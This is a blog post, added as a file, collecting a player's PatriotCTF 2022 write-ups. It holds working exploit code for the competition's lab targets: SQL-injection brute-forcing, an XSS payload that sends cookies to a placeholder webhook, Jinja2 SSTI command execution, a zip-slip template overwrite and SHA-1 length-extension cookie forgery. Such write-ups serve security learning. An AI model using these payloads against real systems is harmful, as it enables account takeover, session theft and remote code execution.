@@ -1,0 +1,463 @@
+---
+layout: post
+title:  "PatriotCTF 2022 Writeup Collection"
+author: "PatriotCTF"
+date:   2022-05-01 00:00:00 +0000
+categories: ctf patriotctf web programming crypto
+description: "its the ctf"
+---
+
+{% raw %}
+
+*[Challenges](https://pctf.competitivecyber.club/challenges)*  
+
+Here are my writeups from PatriotCTF 2022! I came 26th overall, which was higher than I was expecting to get doing almost only the web challenges (which were incredibly fun). Rabbit holes and failed attempted challenges will be at the end. Please enjoy!
+
+(Apologies for the infuriatingly-hard-to-read scripts, naming variables was never my forte)  
+
+---
+
+# Web
+
+## Apocalypse Security - 3
+
+> Good Job bypassing the filter, can you log in as admin now? We were able to find the filter script.  
+>
+> Author: Yojan (drMoscvovium)
+
+I'm only going to be writing up the third challenge rather than the entire series as they all build on from each other, so this writeup should encompass the solutions to the other 2. Anyway, the given script looks like this:
+
+```py
+def detect_sqli(username, password):
+    filters = ['or', 'and', 'admin']
+    for filte in filters:
+        if filte in password or filte in username:
+            return (True, filte)
+    else:
+        return (False, )
+```  
+
+The challenge this time, in contrast to before, is that you have to brute-force the admin's password as opposed to just logging in as the admin. The filters are easily bypassed: you can simply capitalise "or" and "and" and you can just concatenate "adm" and "in" to get "admin". We can build up the password by brute-forcing each character in turn by using some special SQL syntax. The request looks like this:
+
+```
+Username: adm'||'in
+Password: ' OR SUBSTR(`passwOrd`, {pos}, 1) = '{c}
+```  
+
+..., where `pos` is the string index of the character we'd like to bruteforce, and c is the character that it is checked against, to break out of the query that probably looks like:
+
+```sql
+/* Normal */
+SELECT * FROM Users WHERE username = '{inp_username}' AND password = '{inp_password}';
+
+/* Broken out */
+SELECT * FROM Users WHERE username = 'adm'||'in' AND password = '' OR SUBSTR(`passwOrd`, {pos}, 1) = '{c}';
+```  
+
+The logic behind this is that the `WHERE` clause will only evaluate to true when the username is `'adm'||'in'` and the password is either empty (verifiably untrue) or has the character at index `pos` matching our brute-forced character `c`. This leads to us being able to login if and only if `c` matches with the character in the admin's password at index `pos`. We'll be able to tell if we've logged in successfully, as the error message won't appear in the HTML response, so we can automate this using a script. Here's the one I wrote.
+
+```py
+import requests
+from string import printable as p
+# filter out wacky characters and make known/common characters more easily accessible for a faster bruteforce
+p = "_{} \n" + p[:-6].replace('"', "").replace("\\", "").replace("'", "")
+
+s = requests.session()
+url = "http://chal1.pctf.competitivecyber.club:1969/login"
+
+pos = 1
+i = 0
+while True:
+    c = p[i]
+    data = {
+        "username": "adm'||'in",
+        "password": "' OR SUBSTR(`passwOrd`, {pos}, 1) = '{c}".format(
+            pos = pos,
+            c = c
+        )
+    }
+    r = s.post(url, data=data).text
+
+    if "Wrong username or password" in r: # failed login
+        i += 1
+        continue
+
+    pos += 1
+    i = 0
+    print(c, end="")
+```  
+
+Log in to the admin account with this password you've just found, and this reveals the flag.
+
+---
+
+## Chewy or Crunchy
+
+> I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can get into the admin user, I will give you a flag. Feel free to send me a message, I try to respond quickly!  
+>
+> Author: NihilistPenguin (Daniel Getter)
+
+From the challenge description and due to the fact that you can send messages to the mysterious entity `admin`, this seems like an XSS challenge, so let's try to steal the admin's cookies.  
+
+There is a filter on all messages that blocks these characters: `.>{}`, so using a `<script>` tag won't work as you can never end the opening tag to start writing your JavaScript code. However, `<img>` tags can have JavaScript code be executed via use of event handler attributes such as `onerror`, and a payload that works is `<img src=x onerror="javascript:your_payload_here" `, as due to the trailing space, any subsequent HTML is then treated either as part of a new attribute or as the closing part of the tag (if it's `>`). Submitting this payload with some javascript to exfiltrate the admin's cookie then logging in as the admin yields the flag.
+
+```html
+<!-- The src=x raises an error (404 not found) to trigger the onerror event handler. -->
+<img src=x onerror="fetch('https://webhook_link/' + document.cookie);" 
+```
+
+---
+
+## Not So Secret
+
+> I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can get into the admin user, I will give you a flag.
+>
+> Someone hacked my site after I read their message, so I am no longer reading DMs sent to me! >:( On top of that, I am imposing an even harsher special character filter because I don't actually know how to patch my code.
+>
+> p.s. To save you some time, don't try getting a reverse shell
+>
+> Author: NihilistPenguin (Daniel Getter)
+
+I got first blood on this challenge! This was just an SSTI challenge in Jinja2 with some extra steps. We can immediately view the config by sending the message `{{config}}` to anybody, which gives us a secret key of `ifXEaNLEiDLIuquyRKzfeJJWzntoIm` used to sign our Flask session cookies. Using [flask-unsign](https://pypi.org/project/flask-unsign/), we can then decode our original cookie, change `_user_id` to 1 (the admin's id), then sign it with the leaked secret key. Using this cookie to access the webpage yields the flag.  
+
+(There was a filter on these characters: `._[]|\`, but I only found out about it after reading the [official writeup](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/tree/main/Web/Not%20So%20Secret). It's entirely possible to solve the challenge without ever encountering that filter.)
+
+---
+
+## Mr. O
+
+> I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can view the admin.html page, I will give you a flag.
+>
+> Hacked again, so I am now filtering those special words and characters, but I won't tell you what they are so you can't find out how I was hacked. I will give you guys a couple characters back because I got some complaints about going overboard with it, especially about not being able to use a period on a messaging service.
+>
+> p.s. to save you some time, don't try getting a reverse shell
+>
+> Author: NihilistPenguin (Daniel Getter)
+
+I got first blood on this challenge as well! This was a step up from the previous challenge and was unlike any SSTI challenge I'd seen before. The filters were a bit harsher, with `{{` and `}}` filtered out, but luckily `{%` and `%}` weren't, so we could make use of Jinja tags. Additionally, `.` was no longer filtered, so we could now use some common Jinja2 SSTI payloads, such as:
+
+```py
+cycler.__init__.__globals__.os.popen('id').read()
+```
+
+...to achieve RCE. The payload I used in the actual competition looked like this:
+
+```py
+"".__class__.__base__.__subclasses__().__getitem__(200).__init__.__globals__.sys.modules.os.popen("id").read()
+```
+
+...which achieves the same result, less effectively.  
+
+There is a small issue, which is that using Jinja tags, we can't actually directly get the output of our executed commands. However, there is a workaround. We can use `{% if %}` to determine if a certain character exists at a certain index in the output of a command, and to output something to the page if so, similar to the SQL brute-force from before. We can test if anything was indeed output to the page by inspecting the HTML response to leak the results of our comparison. During the competition I thought that this was far too slow to be the intended solution, but it [wasn't](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/tree/main/Web/Mr%20O), and here's the incredibly hackish script I wrote.
+
+```py
+import requests
+from string import printable as p
+p = p[:-6].replace('"', '').replace("\\", "")
+p = "%{}\n \"'<>/._-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" + p # trying to speed things up
+
+s = requests.session()
+url = "http://chal2.pctf.competitivecyber.club:49759/messages"
+
+cook = {"session": ".eJwlzjkOwzAMBdG7qE7xRS0UfRmDFCkkrR1XQe4eA-lngPdJ-zrifKbtfVzxSPvL05bWBA-ZWREBTEUr2h2wRY2WUR-Sw0DZxTWyO6OQhbEMMGyid2iDkTEtNquj9KnO98i55rj7uqQJA1xtSTdpuRcNUfPhlm7Idcbx11D6_gDJRi9K.YmxzIA.y1v2Dr3oNbAkC1XIvQ98FYkT05c"}
+
+i = 0 # should be 0 but if you cant be bothered to wait then skip a couple numbers, flag starts at around index 122 on admin.html
+
+c_i = 0
+while True:
+    c = "\\x" + ("0" * (3 == len(hex(ord(p[c_i]))))) + hex(ord(p[c_i]))[2:] # this hex encodes the characters eg "/" goes to "\x2f" but in an unnecessarily complex way because
+    data = {
+        "username": "a",
+        "message": f"""{{% if "".__class__.__base__.__subclasses__().__getitem__(200).__init__.__globals__.sys.modules.os.popen("cat app/templates/admin.html").read().__getitem__({i}) == "{c}" %}}
+            works
+        {{% endif %}}"""
+    }
+    r = s.post(url, cookies=cook, data=data).text
+
+    if r.split("Just sent your message: ")[1][0].startswith("works"): # if "works" is output, ie the character we guessed, c, does indeed exist in the output at index i
+        i += 1 # ...so move onto the next index
+        print(str(bytes.fromhex(c[2:]))[2:-1], end = "") # ...add it on to our known output
+        c_i = 0 # ...and reset back to the first character to brute force once again
+    else:
+        c_i += 1 # otherwise, it didn't work, so test the next character
+```
+
+---
+
+## ZaaS
+
+> I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can view the admin.html page, I will give you a flag.
+>
+> Due to market research, I think I found an opportunity. Nobody seems to know how to unzip files, so I made (un)Zip as a Service! I have learned from my mistakes, so I will be giving you the source code for the unzipping functionality (app/routes/upload.py) as well running the app in debug mode so you can tell me how to fix my inevitably vulnerable code!
+>
+> Author: NihilistPenguin (Daniel Getter)
+
+This one was the most fun challenge for me. We're given the same site as before, but now the focus is on the new functionality of uploading `.zip` files to be unzipped. The vulnerability lies in this block of code:
+
+```py
+# upload.py
+
+def upload():
+    # ...
+    filename = secure_filename(file.filename)
+    upload_dir = app.config['UPLOAD_FOLDER'] + "/" + filename.rsplit('.', 1)[0]
+    # ...
+    with zipfile.ZipFile(file, "r") as zf:
+        for f in zf.infolist():
+            with open(os.path.join(upload_dir, f.filename), 'wb') as tf:
+                tf.write(zf.open(f.filename, 'r').read())
+    #...
+    return render_template('upload.html', name=current_user.username)
+```
+
+The name of our zip file is not important as special OS characters are filtered out by the `secure_filename` function, and finding a 0-day in a Werkzeug library is probably a bit too hard for a challenge in this CTF.  
+
+However, despite the name of our zip being filtered, the names of the files (`f.filename`) contained within the zip are not filtered, so we can overwrite or create a file in an arbitrary location of our choosing, with arbitrary content. Well, one good use for this is creating new templates in the `/app/app/templates/` folder. If we overwrote the `/app/app/templates/upload.html` file with an HTML file containing malicious Python code (in template format), the `render_template` call from the code above would let us achieve SSTI. I did the scripting in Python IDLE at the time, so here's the retroactively written script to generate the malicious zip.
+
+```py
+import zipfile
+
+with zipfile.ZipFile("exploit.zip", "w") as zf:
+    zf.writestr("../../../../../../../app/app/templates/upload.html", "{{cycler.__init__.__globals__.os.popen('cat /app/app/templates/admin.html').read}}")
+    zf.close()
+```
+
+Uploading this now will overwrite the `upload.html` file with a file containing our malicious Jinja templating code, then render `upload.html`, evaluating our code and printing out the contents of `admin.html`, as required.
+
+---
+
+# Crypto
+
+## Merkle-Derkle
+
+> I'm new to web development, so I'm still trying to figure out how to properly secure and authenticate user sessions. If you find a way to authenticate as admin, I will give you the flag. To help you in your endeavors, I will provide you with the main app source code.
+>
+> Challenge Author: NihilistPenguin (Daniel Getter)
+
+The solution to this challenge followed a textbook hash extension attack. To get the flag, your auth cookie must have passed the following check:
+
+```py
+# upload.py
+def validate(cookie):
+    user_hex = cookie.split(".")[0]
+    user = bytes.fromhex(user_hex)
+    data = secret.encode() + user
+    
+    cookie_mac = cookie.split(".")[1]
+    if cookie_mac != sha1(data).hexdigest():
+        raise Exception("MAC does not match!")
+    
+    return ast.literal_eval(user.split(b"=")[-1].decode())
+```
+
+...and we are set a cookie `auth` by the server automatically, which is signed with a variable length secret between 15-35 bytes long using SHA-1 and concatenated with the hex-encoded data `admin=False` with a `.` delimiter, as shown here:
+
+```py
+# upload.py
+letters = string.ascii_letters
+secret = ''.join(random.choice(letters) for i in range(random.randint(15,35)))
+def new_user():
+    user = "admin=False"
+    data = secret + user
+    mac = sha1(data.encode()).hexdigest()
+    cookie_val = user.encode().hex() + "." + mac
+    return cookie_val
+```
+
+We should like to provide some new data such that the last line of the `validate` function returns `True` instead.  
+
+Luckily, SHA-1 is used, which is vulnerable to hash extension. This means that we can append certain data to our known data, such that, due to the way the SHA-1 hash is calculated (in blocks of 64 bytes, appending predictable extra data until it evenly divides into these blocks), the calculated hash of the first block is identical to the hash we are given, which we can then use to calculate the hash of the second block without ever knowing the secret. Of course, we have to know the length of the secret to make sure that we can know how many bytes to add to complete the first block - though, there's only 21 values that need to be checked, which is easily brute-forced. I used [hlextend by stephenbradshaw](https://github.com/stephenbradshaw/hlextend) to perform the attack for me. Here's the script to generate the forged cookies via this attack:
+
+```py
+import hlextend
+import requests
+import ast
+import re
+
+for i in range(14, 36):
+    sha = hlextend.new("sha1")
+    new_data = sha.extend("=True", "admin=False", i, "a25eb434794e82de3de9b23c0d550a9156178fd2")
+    # hlextend takes care of adding all the extra padding to fill up the first block. we just specify what data we want to add
+    new_data_hexscaped = ""
+    ii = 0
+
+    # excuse the mess (explanation at bottom of post)
+    while ii < len(new_data):
+        c = new_data[ii]
+        if c == "\\":
+            ii += 2
+            new_data_hexscaped += chr(int(new_data[ii:ii+2], 16))
+            ii += 2
+        else:
+            new_data_hexscaped += c
+            ii += 1
+    new_data_hexscaped = bytes(new_data_hexscaped, "latin1").hex()
+
+    out = new_data_hexscaped + "." + sha.hexdigest()
+
+    r = requests.get("http://chal2.pctf.competitivecyber.club:51036/", cookies={"auth":out})
+
+    if "MAC" not in r.text:
+        print(r.text)
+```
+
+Now, on the one of these that assumes the correct length for the secret, the `return` line on the `validate` function will then evaluate the last item when the decoded data is split by `=` delimiters, which is `True`. This will give us the flag.  
+
+Here's a [really good article](https://journal.batard.info/post/2011/03/04/exploiting-sha-1-signed-messages) if you want to read up more on hash extension attacks, which goes a lot more in-depth with actual diagrams and wizardry.
+
+---
+
+# Programming
+
+I'm going to skim over both of these challenges as they followed largely the same format.
+
+## Big Shaq
+
+> Are you on Big Shaq's math level? Solve 5 questions before the time runs out to see if you're worthy.
+>
+> Challenge Author: NihilistPenguin (Daniel Getter)
+
+Connecting to the service yields a system of 5 linear equations and a 6th expression to evaulate, which looks a bit like this:
+
+```
+a + b + e + d = 5
+b + b + d + a = 7
+b + e + a + a = -53
+a + c + e + c = 25
+d + d + a + c = 13
+
+a + b + e + e = ?
+```
+
+...but with weirder variable names to deal with, and you have to solve them in a very short time. You could write your own code to solve these equations using matrices, finding the inverse, then pre-multiplying both sides by the inverse, etc... or you could just use numpy, which does it for you and also kinda invalidates the whole programming bit. Who would ever do such a thing?
+
+```py
+import numpy as np
+from pwn import *
+
+conn = remote("chal2.pctf.competitivecyber.club", 50587)
+
+for x in range(5): # the fact that there are 5 questions is left as a proof to the reader
+    eqs = []
+    print(conn.recvline()) # q no
+
+    for eq in range(5):
+        j = conn.recvline()
+        # print(j)
+        eqs.append(
+            str(j)[1:-1].strip("\\n").strip("'").split(" = ")
+        ) # eqs
+
+    conn.recvline() # blank
+    solve = str(conn.recvuntil(b" ="))[1:-1].strip("\\n").strip("'").strip(" =").split(" + ")
+
+
+    # process data
+
+    eqs = list(map(lambda x: [x[0].split(" + "), int(x[1])], eqs))
+    var = []
+    variables = list(range(10000))
+
+    for x in eqs:
+        for i, v in enumerate(x[0]):
+            if v not in var:
+                var.append(v)
+            x[0][i] = variables[var.index(v)]
+
+    for i, v in enumerate(solve):
+        solve[i] = variables[var.index(v)]
+
+
+
+    print(f"Eqs to solve: {eqs}")
+    print(f"Get: {solve}")
+
+    ans_matrix = []
+    eq_matrix = []
+    for eq in eqs:
+        eq, ans = eq
+        out = []
+        for x in range(len(var)):
+            out.append(eq.count(x))
+        eq_matrix.append(out)
+        ans_matrix.append(ans)
+
+    print(eq_matrix)
+    print(ans_matrix)
+
+
+    ans = 0
+    res = np.linalg.solve(eq_matrix, ans_matrix) # use numpy to solve the system of linear eq
+    for var_num in solve:
+        ans += res[var_num]
+    conn.send(bytes(str(int(ans)), "utf-8"))
+    conn.recvline() # blank
+    print(conn.recvline()) # "CORRECT"
+
+print(conn.recvline())
+print(conn.recvline())
+
+```
+
+---
+
+## CaptSHA
+
+> This service requires some sort of captcha to access it. Can you get in?
+>
+> Challenge Author: Andy Smith
+
+Find a SHA-1 hash with last 4 letters matching some given 4 letters.
+
+```py
+from hashlib import sha1 as s
+from pwn import *
+
+conn = remote("chal1.pctf.competitivecyber.club", 10006)
+
+data = conn.recvuntil(b"whose SHA1 hash ")
+
+# print(data)
+
+
+counter = 0
+for x in range(25): # guess a random number from 24 to 26 (non-inclusive)
+    counter += 1
+    conn.recvuntil(b"ends with ")
+    needed = str(conn.recvuntil(b" "))[2:-1].strip(": ") # match this
+    res = "hfuwigiwrhiuwruibwuirhhuiwbhwrubhwurbiiwhrbuhiwrhbhuwiriub" # the probability that the last 4 letters of this match the given 4 letters is 0.00022% and a little risk is better than none
+    n = 0
+
+    print(f"WE NEED {needed}")
+
+    print(res[-len(needed):] != needed)
+    while res[-len(needed):] != needed:
+        n += 1
+        res = s(bytes(str(n), "utf-8")).hexdigest()
+
+    print(f"FOUND: {res}")
+
+
+    conn.send(bytes(str(n) + "\n", "utf-8"))
+
+    print(conn.recvline())
+    print(f"WON: {counter}")
+
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+```
+
+---
+
+# Extra Notes
+
+**TaaS**: I was stuck on this for quite a while, trying to find distinctions between tar and zip files, as well as trying to see how os.remove on an arbitrary file could possibly lead to RCE (I tried deleting db.sqlite to see if I could then create a new admin account, deleting upload.py, etc.). The intended solution was a race condition and can be read [here](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/tree/main/Web/TaaS).  
+
+**Curly Fry**: This one stumped me because I didn't know about Go's intricacies regarding paths and HTTP request methods, and so despite all of my efforts, I would keep gettng redirected. Trying `..%5C` (backslashes) didn't work either. The official writeup is [here](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/tree/main/Web/Curly%20Fry).  
+
+**Merkle-Derkle**: I spent 4 hours on that challenge!!! It was mostly due to me having never done this sort of attack before, and also UTF-8 splitting up the bytes in the extension payload, which I didn't realise for a very long time. The horrible script is a reflection of this, and I hope that I will never feel so desperate as to use `ii` to refer to an index ever again.  
+
+Thank you very much for reading.
+
+{% endraw %}
